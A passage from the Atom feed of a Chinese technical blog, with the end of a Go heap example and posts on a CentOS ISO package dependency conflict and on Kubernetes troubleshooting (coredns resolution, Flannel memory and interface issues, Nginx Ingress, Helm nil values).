<span class="title">interface</span></span>&#123;&#125; &#123;</span><br><span class="line">old := *h</span><br><span class="line">n := <span class="built_in">len</span>(old)</span><br><span class="line">x := old[n<span class="number">-1</span>]</span><br><span class="line">*h = old[<span class="number">0</span> : n<span class="number">-1</span>]</span><br><span class="line"><span class="keyword">return</span> x</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// This example inserts several ints into an IntHeap, checks the minimum,</span></span><br><span class="line"><span class="comment">// and removes them in order of priority.</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">h := &amp;IntHeap&#123;<span class="number">2</span>, <span class="number">1</span>, <span class="number">5</span>&#125;</span><br><span class="line">heap.Init(h)</span><br><span class="line">heap.Push(h, <span class="number">3</span>)</span><br><span class="line">fmt.Println(h)</span><br><span class="line">heap.Remove(h, <span class="number">2</span>)</span><br><span class="line"><span class="keyword">for</span> h.Len() &gt; <span class="number">0</span> &#123;</span><br><span class="line">fmt.Printf(<span class="string">"%d "</span>, heap.Pop(h))</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>Heap 的使用场景有：优先级队列、TopK 等等。</p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><ul><li><a href="https://godoc.org/container/heap" target="_blank" rel="noopener">https://godoc.org/container/heap</a></li><li><a href="https://docs.python.org/3.7/library/heapq.html" target="_blank" rel="noopener">https://docs.python.org/3.7/library/heapq.html</a></li><li><a href="https://ieevee.com/tech/2018/01/29/go-heap.html" target="_blank" rel="noopener">https://ieevee.com/tech/2018/01/29/go-heap.html</a></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;背景&quot;&gt;&lt;a href=&quot;#背景&quot; class=&quot;headerlink&quot; title=&quot;背景&quot;&gt;&lt;/a&gt;背景&lt;/h2&gt;&lt;p&gt;最近使用到了 heap 这个数据结构，记录一下在 Python 和 Golang 中最基本的使用方法～ &lt;/p&gt;
&lt;blockquote&gt;

      
    
    </summary>
    
    
      <category term="Golang" scheme="https://zdyxry.github.io/tags/Golang/"/>
    
      <category term="Python" scheme="https://zdyxry.github.io/tags/Python/"/>
    
  </entry>
  
  <entry>
    <title>CentOS定制-软件源错误</title>
    <link href="https://zdyxry.github.io/2019/07/21/CentOS%E5%AE%9A%E5%88%B6-%E8%BD%AF%E4%BB%B6%E6%BA%90%E9%94%99%E8%AF%AF/"/>
    <id>https://zdyxry.github.io/2019/07/21/CentOS定制-软件源错误/</id>
    <published>2019-07-21T11:58:43.000Z</published>
    <updated>2019-07-21T12:00:33.172Z</updated>
    
    <content type="html"><![CDATA[<h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p>我一直在维护一个公司内部的 OS 发行版，是基于 CentOS 的，最近接到了一个需求，是需要更新 Kernel 及一些软件包，但是遇到了无法安装 OS 的问题，记录一下解决方式。</p><h2 id="定制-OS"><a href="#定制-OS" class="headerlink" title="定制 OS"></a>定制 OS</h2><p>关于定制 OS，在之前的博客中已经提到过几次了，CentOS 是比较容易改动的一个发行版，因为有着 RHEL 红（爸）帽（爸），有着完善的文档可以参考。</p><p>主要需要注意的是两点：  </p><ol><li>分区方式</li><li>软件包选择</li></ol><p>今天遇到的问题是第二点。</p><p>先说下前提，由于是 2B 产品，所以对于每次的 BaseOS 版本升级都非常谨慎，每次 BaseOS 版本都会进行各种测试。但是如果仅仅是升级部分所需要的软件包，就不用这么麻烦了，我们可以定制自己所需要的软件组（group），来进行安装/升级。</p><h2 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h2><p>这次接到的需要是升级 Kernel、libiscsi、qemu 三个软件，后两个是虚拟化相关的，相关依赖较少；kernel 是跟 BaseOS 版本关联性很大的。</p><p>比如 CentOS 7.6 中，kernel 版本为：kernel-3.10.0-957.el7.x86_64.rpm，这个版本对 selinux 等相关软件是有依赖要求的，我在这里翻车了。</p><h2 id="解决"><a href="#解决" class="headerlink" title="解决"></a>解决</h2><p>像往常一样，将对应的 rpm 放置到了对应的 yum 源中，更新 yum 源，制作 ISO，在安装过程中报错：</p><img src="/2019/07/21/CentOS定制-软件源错误/os1.png" title="OS1"><p>报错显示是软件源出了问题，但是没有更多的信息了，这时候我们可以通过 console 连接到其他的 pty 中，查看对应的日志，比如 CentOS 默认的日志在： <code>/tmp/packaging.log</code> 中：</p><img src="/2019/07/21/CentOS定制-软件源错误/os2.png" title="OS2"><p>我们可以看到日志中提示 kernel 与当前软件源中的 selinux-policy-targeted 冲突，因为安装 OS 所用的软件源就是 ISO ，所以这里肯定是我们打包 ISO 时遗漏了依赖关系导致的，我们将对应的 Kernel 所需依赖更新，重新构建 ISO 就可以了。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;背景&quot;&gt;&lt;a href=&quot;#背景&quot; class=&quot;headerlink&quot; title=&quot;背景&quot;&gt;&lt;/a&gt;背景&lt;/h2&gt;&lt;p&gt;我一直在维护一个公司内部的 OS 发行版，是基于 CentOS 的，最近接到了一个需求，是需要更新 Kernel 及一些软件包，但是遇到了无
      
    
    </summary>
    
    
      <category term="Linux" scheme="https://zdyxry.github.io/tags/Linux/"/>
    
  </entry>
  
  <entry>
    <title>Kubernetes 实战-踩坑记录（持续更新）</title>
    <link href="https://zdyxry.github.io/2019/07/13/Kubernetes-%E5%AE%9E%E6%88%98-%E8%B8%A9%E5%9D%91%E8%AE%B0%E5%BD%95%EF%BC%88%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0%EF%BC%89/"/>
    <id>https://zdyxry.github.io/2019/07/13/Kubernetes-实战-踩坑记录（持续更新）/</id>
    <published>2019-07-13T01:34:45.000Z</published>
    <updated>2019-07-18T22:59:27.920Z</updated>
    
    <content type="html"><![CDATA[<h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p>在对现有服务进行容器话改造的过程中，随着对 K8S 使用程度越来越深，也渐渐的遇到了一些坑，所以开一篇博客，记录自己所遇到的坑，应该会长期更新。</p><h3 id="更新记录"><a href="#更新记录" class="headerlink" title="更新记录"></a>更新记录</h3><ul><li>2019.07.13 02:00 来自加班中的 yiran</li><li>2019.07.19 06:52 早起不想去公司的 yiran</li></ul><h2 id="coredns-无法解析域名"><a href="#coredns-无法解析域名" class="headerlink" title="coredns 无法解析域名"></a>coredns 无法解析域名</h2><p>在 Kubernetes 环境中，使用 kubeadm 工具部署的集群，会自动部署 coredns 作为集群的域名服务，每当我们创建了自己的 service，都可以通过域名直接访问，不用再考虑自己多个 Pod 的 IP 不同如何连接的问题。</p><p>最近遇到多个环境出现无法解析域名的问题，具体现象如下：</p><ol><li>集群部署完成后，部署 daemonset 资源，每个节点均运行一个 busybox；</li><li>在 busybox 中对 <code>kubernetes</code> 默认域名进行解析，查看解析结果。</li></ol><p>正常情况应该是所有的 busybox 都可以正常解析才对，但是最近几个环境中均出现了 3 个node 中1个node 上的 pod 无法解析的问题，示例代码如下：</p><p>daemonset.yaml<br><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">apiVersion:</span> <span class="string">"extensions/v1beta1"</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">"DaemonSet"</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line"><span class="attr">  name:</span> <span class="string">"ds"</span></span><br><span class="line"><span class="attr">  namespace:</span> <span class="string">"default"</span></span><br><span class="line"><span class="attr">spec:</span></span><br><span class="line"><span class="attr">  template:</span></span><br><span class="line"><span class="attr">    metadata:</span></span><br><span class="line"><span class="attr">      labels:</span></span><br><span class="line"><span class="attr">        app:</span> <span class="string">ds</span></span><br><span class="line"><span class="attr">    spec:</span></span><br><span class="line"><span class="attr">      tolerations:</span></span><br><span class="line"><span class="attr">      - key:</span> <span class="string">node-role.kubernetes.io/master</span></span><br><span class="line"><span class="attr">        effect:</span> <span class="string">NoSchedule</span></span><br><span class="line"><span class="attr">      containers:</span></span><br><span class="line"><span class="attr">      - name:</span> <span class="string">"apply-sysctl"</span></span><br><span class="line"><span class="attr">        image:</span> <span class="string">"busybox:1.28.4"</span></span><br><span class="line"><span class="attr">        imagePullPolicy:</span> <span class="string">IfNotPresent</span></span><br><span class="line"><span class="attr">        command:</span></span><br><span class="line"><span class="bullet">        -</span> <span class="string">"/bin/sh"</span></span><br><span class="line"><span class="bullet">        -</span> <span class="string">"-c"</span></span><br><span class="line"><span class="bullet">        -</span> <span class="string">|</span></span><br><span class="line"><span class="string">          set -o errexit</span></span><br><span class="line"><span class="string">          set -o xtrace</span></span><br><span class="line"><span class="string">          while true</span></span><br><span class="line"><span class="string">          do</span></span><br><span class="line"><span class="string">            sleep 2s</span></span><br><span class="line"><span class="string">            date</span></span><br><span class="line"><span class="string">            echo "diu~"</span></span><br><span class="line"><span class="string">          done</span></span><br></pre></td></tr></table></figure></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">[root@node11 21:28:40 ~]<span class="variable">$for</span> i <span class="keyword">in</span> `kubectl get pod  -o wide  |grep ds | awk <span class="string">'&#123;print $1&#125;'</span>`;<span class="keyword">do</span> kubectl <span class="built_in">exec</span> <span class="variable">$i</span> nslookup kubernetes;<span class="built_in">echo</span> ;<span class="keyword">done</span></span><br><span class="line">Server:    10.96.0.10</span><br><span class="line">Address 1: 10.96.0.10</span><br><span class="line"></span><br><span class="line">nslookup: can<span class="string">'t resolve '</span>kubernetes<span class="string">'</span></span><br><span class="line"><span class="string">command terminated with exit code 1</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Server:    10.96.0.10</span></span><br><span class="line"><span class="string">Address 1: 10.96.0.10 kube-dns.kube-system.svc.cluster.local</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Name:      kubernetes</span></span><br><span class="line"><span class="string">Address 1: 10.96.0.1 kubernetes.default.svc.cluster.local</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Server:    10.96.0.10</span></span><br><span class="line"><span class="string">Address 1: 10.96.0.10 kube-dns.kube-system.svc.cluster.local</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Name:      kubernetes</span></span><br><span class="line"><span class="string">Address 1: 10.96.0.1 kubernetes.default.svc.cluster.local</span></span><br></pre></td></tr></table></figure><p>在第一个节点的 Pod 解析时失效，最后命令执行 1min 超时退出。</p><p>经过查看发现节点的 NetFilter 相关系统配置未生效，导致 iptables 相关功能失效，具体可以参考 <a href="https://github.com/kubernetes/kubernetes/issues/21613" target="_blank" rel="noopener">issue</a>。</p><p>解决方式：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">'1'</span> &gt; /proc/sys/net/bridge/bridge-nf-call-iptables</span><br></pre></td></tr></table></figure><h2 id="Flannel-OOM"><a href="#Flannel-OOM" class="headerlink" title="Flannel OOM"></a>Flannel OOM</h2><p>在配置好集群业务后，发现业务时不时的出现中断情况，最开始排查业务自身问题，未发现 Pod 出现重启或异常的日志，开始排查 k8s 状态，发现在节点 <code>/var/log/messages</code> 日志中，Flannel 一直处于 OOM 状态，惨不忍睹。</p><p>之前还略微惊奇，Flannel 默认的计算资源中，内存只要 50MiB，且上限也是 50MiB，没有给自己留一丝余地，看到 <a href="https://github.com/coreos/flannel/issues/963" target="_blank" rel="noopener">issue</a> 中的描述，感觉这个不是一个偶发事件，最终我将 Flannel 的内存调整为 250MiB 后，未出现 OOM 情况。</p><p>issue 中提到的 <code>kubectl patch</code> 命令未自动生效，我通过更新 ds 配置，然后依次手动删除节点上的 Flannel Pod 使其生效。</p><h2 id="Nginx-Ingress"><a href="#Nginx-Ingress" class="headerlink" title="Nginx Ingress"></a>Nginx Ingress</h2><p>Nginx Ingress 有多个版本，在编写 Ingress 规则的时候一定要看清自己集群中的 Nginx Ingress 版本，我最开始就是因为这个看错了文档。。</p><p>主要的版本有： <code>kubernetes/ingress-nginx</code> , <code>nginxinc/kubernetes-ingress with NGINX</code> 和 <code>nginxinc/kubernetes-ingress with NGINX PLUS</code> ，具体的对比规则可以在 <a href="https://github.com/nginxinc/kubernetes-ingress/blob/master/docs/nginx-ingress-controllers.md" target="_blank" rel="noopener">Github</a> 中了解。</p><p>在 <code>kubernetes/ingress-nginx</code> 中，默认 <code>ssl-redirect</code> 参数是 <code>true</code> ，如果自己的服务不支持 https，那么需要显示的声明该参数为 false 才可以，这里需要注意一下。</p><p>在配置 nginx 参数的时候，要注意语法，正确的书写方式如下：</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">apiVersion:</span> <span class="string">extensions/v1beta1</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">Ingress</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line"><span class="attr">  annotations:</span></span><br><span class="line">    <span class="string">kubectl.kubernetes.io/last-applied-configuration:</span> <span class="string">|</span></span><br><span class="line"><span class="string">      &#123;"apiVersion":"networking.k8s.io/v1beta1","kind":"Ingress","metadata":&#123;"annotations":&#123;"kubernetes.io/ingress.class":"nginx","nginx.ingress.kubernetes.io/proxy-read-timeout":"3600","nginx.ingress.kubernetes.io/proxy-send-timeout":"3600","nginx.ingress.kubernetes.io/ssl-redirect":"true","nginx.ingress.kubernetes.io/use-regex":"true","nginx.org/websocket-services":"websockify"&#125;,"name":"websockify","namespace":"default"&#125;,"spec":&#123;"rules":[&#123;"http":&#123;"paths":[&#123;"backend":&#123;"serviceName":"websockify","servicePort":8000&#125;,"path":"/websockify"&#125;]&#125;&#125;]&#125;&#125;</span></span><br><span class="line"><span class="string">    kubernetes.io/ingress.class: nginx</span></span><br><span class="line"><span class="string">    nginx.ingress.kubernetes.io/proxy-read-timeout: "3600"</span></span><br><span class="line"><span class="string">    nginx.ingress.kubernetes.io/proxy-send-timeout: "3600"</span></span><br></pre></td></tr></table></figure><p>相关 issue 链接： <a href="https://github.com/kubernetes/ingress-nginx/issues/2007" target="_blank" rel="noopener">https://github.com/kubernetes/ingress-nginx/issues/2007</a> </p><h2 id="Docker-稳定性"><a href="#Docker-稳定性" class="headerlink" title="Docker 稳定性"></a>Docker 稳定性</h2><p>在修改 Docker 配置后，需要重启 Docker.service 使配置生效，在一次重启操作中，直接导致物理节点宕机，自动重启了。。。</p><p>重启后观察物理节点日志，未发现异常日志，目前待复现调查，很坑很诡异。</p><h2 id="Helm-values-为空更新错误"><a href="#Helm-values-为空更新错误" class="headerlink" title="Helm values 为空更新错误"></a>Helm values 为空更新错误</h2><p>今天在给应用编写 Helm Charts 的时候，在 Values 中通过 resources.requests.cpu 方式指定了 cpu 和内存，在测试的时候忘记填写具体数值了，像这面这样：</p><p>values:<br><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Default values for test.</span></span><br><span class="line"><span class="comment"># This is a YAML-formatted file.</span></span><br><span class="line"><span class="comment"># Declare variables to be passed into your templates.</span></span><br><span class="line"></span><br><span class="line"><span class="attr">resources:</span></span><br><span class="line"><span class="attr">  limits:</span></span><br><span class="line"><span class="attr">   cpu:</span></span><br><span class="line"><span class="attr">   memory:</span></span><br><span class="line"><span class="attr">  requests:</span></span><br><span class="line"><span class="attr">   cpu:</span></span><br><span class="line"><span class="attr">   memory:</span></span><br></pre></td></tr></table></figure></p><p>在 helm templates 中定义 daemonset，指定使用 resources 字段。</p><p>直接执行 helm 命令安装成功了：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">[root@node11 20:44:09 <span class="built_in">test</span>]<span class="variable">$helm</span> install . --name-template <span class="built_in">test</span></span><br><span class="line">NAME: <span class="built_in">test</span></span><br><span class="line">LAST DEPLOYED: 2019-07-15 20:44:18.151073881 +0800 CST m=+0.092592446</span><br><span class="line">NAMESPACE: default</span><br><span class="line">STATUS: deployed</span><br><span class="line"></span><br><span class="line">NOTES:</span><br><span class="line">1. Get the application URL by running these commands:</span><br><span class="line">  <span class="built_in">export</span> POD_NAME=$(kubectl get pods -l <span class="string">"app=test,release=test"</span> -o jsonpath=<span class="string">"&#123;.items[0].metadata.name&#125;"</span>)</span><br><span class="line">  <span class="built_in">echo</span> <span class="string">"Visit http://127.0.0.1:8080 to use your application"</span></span><br><span class="line">  kubectl port-forward <span class="variable">$POD_NAME</span> 8080:80</span><br></pre></td></tr></table></figure><p>我们查看创建出来的 daemonset 资源状态：</p><p>daemonset/test</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="attr">Name:</span>           <span class="string">test</span></span><br><span class="line"><span class="attr">Selector:</span>       <span class="string">app=test</span></span><br><span class="line"><span class="attr">Node-Selector:</span>  <span class="string">&lt;none&gt;</span></span><br><span class="line"><span class="string">Pods</span> <span class="attr">Status:</span>  <span class="number">3</span> <span class="string">Running</span> <span class="string">/</span> <span class="number">0</span> <span class="string">Waiting</span> <span class="string">/</span> <span class="number">0</span> <span class="string">Succeeded</span> <span class="string">/</span> <span class="number">0</span> <span class="string">Failed</span></span><br><span class="line"><span class="string">Pod</span> <span class="attr">Template:</span></span><br><span class="line"><span class="attr">  Labels:</span>  <span class="string">app=test</span></span><br><span class="line"><span class="attr">  Containers:</span></span><br><span class="line"><span class="attr">   test:</span></span><br><span class="line"><span class="attr">    Image:</span>      <span class="string">harbor.zdyxry.com/test/test:0.1.2</span></span><br><span class="line"><span class="attr">    Port:</span>       <span class="number">10402</span><span class="string">/TCP</span></span><br><span class="line">    <span class="string">Host</span> <span class="attr">Port:</span>  <span class="number">10402</span><span class="string">/TCP</span></span><br><span class="line"><span class="attr">    Command:</span></span><br><span class="line">      <span class="string">/bin/sh</span></span><br><span class="line"><span class="bullet">      -</span><span class="string">c</span></span><br><span class="line"><span class="attr">    Args:</span></span><br><span class="line">      <span class="string">gunicorn</span> <span class="bullet">-b</span> <span class="string">:10402</span> <span class="bullet">-k</span> <span class="string">gevent</span> <span class="string">test.main:flask_app</span> <span class="bullet">-w</span> <span class="number">2</span> <span class="bullet">--timeout</span> <span class="number">40</span> <span class="bullet">--pid</span> <span class="string">/var/run/test.pid</span></span><br><span class="line"><span class="attr">    Limits:</span></span><br><span class="line"><span class="attr">      cpu:</span>     <span class="number">0</span></span><br><span class="line"><span class="attr">      memory:</span>  <span class="number">0</span></span><br><span class="line"><span class="attr">    Requests:</span></span><br><span class="line"><span class="attr">      cpu:</span>        <span class="number">0</span></span><br><span class="line"><span class="attr">      memory:</span>     <span class="number">0</span></span><br><span class="line"><span class="attr">    Environment:</span>  <span class="string">&lt;none&gt;</span></span><br></pre></td></tr></table></figure><p>这时候我在检查资源的时候发现自己忘记设置资源了，我计划通过更新 values 数值来更新 daemonset：</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Default values for test.</span></span><br><span class="line"><span class="comment"># This is a YAML-formatted file.</span></span><br><span class="line"><span class="comment"># Declare variables to be passed into your templates.</span></span><br><span class="line"></span><br><span class="line"><span class="attr">resources:</span></span><br><span class="line"><span class="attr">  limits:</span></span><br><span class="line"><span class="attr">   cpu:</span> <span class="number">100</span><span class="string">m</span></span><br><span class="line"><span class="attr">   memory:</span> <span class="number">100</span><span class="string">Mi</span></span><br><span class="line"><span class="attr">  requests:</span></span><br><span class="line"><span class="attr">   cpu:</span> <span class="number">100</span><span class="string">m</span></span><br><span class="line"><span class="attr">   memory:</span> <span class="number">100</span><span class="string">Mi</span></span><br></pre></td></tr></table></figure><p>执行 helm upgrade 时候报错：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[root@node11 20:49:36 <span class="built_in">test</span>]<span class="variable">$helm</span> upgrade <span class="built_in">test</span> .</span><br><span class="line">Error: UPGRADE FAILED: error validating <span class="string">""</span>: error validating data: [unknown object <span class="built_in">type</span> <span class="string">"nil"</span> <span class="keyword">in</span> DaemonSet.spec.template.spec.containers[0].resources.limits.cpu, unknown object <span class="built_in">type</span> <span class="string">"nil"</span> <span class="keyword">in</span> DaemonSet.spec.template.spec.containers[0].resources.limits.memory, unknown object <span class="built_in">type</span> <span class="string">"nil"</span> <span class="keyword">in</span> DaemonSet.spec.template.spec.containers[0].resources.requests.cpu, unknown object <span class="built_in">type</span> <span class="string">"nil"</span> <span class="keyword">in</span> DaemonSet.spec.template.spec.containers[0].resources.requests.memory]</span><br></pre></td></tr></table></figure><p>根据报错信息可以看到这个字段之前是 <code>nil</code> ，现在我们要更新为有效类型更新失败，只能通过 <code>helm uninstall</code> 卸载后再次安装修复该问题。</p><p>这个问题只在 daemonset 类型下会出现。</p><h2 id="Flannel-网卡丢失"><a href="#Flannel-网卡丢失" class="headerlink" title="Flannel 网卡丢失"></a>Flannel 网卡丢失</h2><p>在通常情况下，我们的 k8s 节点都只有单一的网络环境，也就是有一块网卡，在部署 Flannel 插件的时候，默认会找默认路由所在的网卡，并将其绑定在上面。</p><p>由于内部测试环境较为特殊，我将其绑定在一个 ovs port 上，这个具体配置在 flannel yaml 中：</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">containers:</span></span><br><span class="line"><span class="attr">- name:</span> <span class="string">kube-flannel</span></span><br><span class="line"><span class="attr">  image:</span> <span class="string">quay.io/coreos/flannel:v0.11.0-amd64</span></span><br><span class="line"><span class="attr">  command:</span></span><br><span class="line"><span class="bullet">  -</span> <span class="string">/opt/bin/flanneld</span></span><br><span class="line"><span class="attr">  args:</span></span><br><span class="line"><span class="bullet">  -</span> <span class="bullet">--ip-masq</span></span><br><span class="line"><span class="bullet">  -</span> <span class="bullet">--kube-subnet-mgr</span></span><br><span class="line"><span class="bullet">  -</span> <span class="bullet">--iface=port-storage</span>  <span class="comment"># 在这里我强制指定了 iface</span></span><br></pre></td></tr></table></figure><p>正常运行时时没有问题的，但是对 ovs port 进行了 <code>ifdown</code> 操作后，在 OS 层面就无法找到这个 ovs port 了，flannel 默认的 <code>flannel.1</code> 这个 link 也丢失了，当我尝试 <code>ifup</code> ovs port，这个 port 正常恢复工作了，但是 <code>flannel.1</code> 无法自动恢复，目前找到的办法是手动重建 flannel pod。</p><p>猜测这个动作在 flannel 的init 相关步骤执行的，在之后 container 正常运行时没有考虑 <code>flannel.1</code> 不存在的情况。</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>使用经验通常是踩了一个又一个坑过来的~ </p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;背景&quot;&gt;&lt;a href=&quot;#背景&quot; class=&quot;headerlink&quot; title=&quot;背景&quot;&gt;&lt;/a&gt;背景&lt;/h2&gt;&lt;p&gt;在对现有服务进行容器话改造的过程中，随着对 K8S 使用程度越来越深，也渐渐的遇到了一些坑，所以开一篇博客，记录自己所遇到的坑，应该会长期更
      
    
    </summary>
    
    
      <category term="Kubernetes" scheme="https://zdyxry.github.io/tags/Kubernetes/"/>
    
  </entry>
  
</feed>
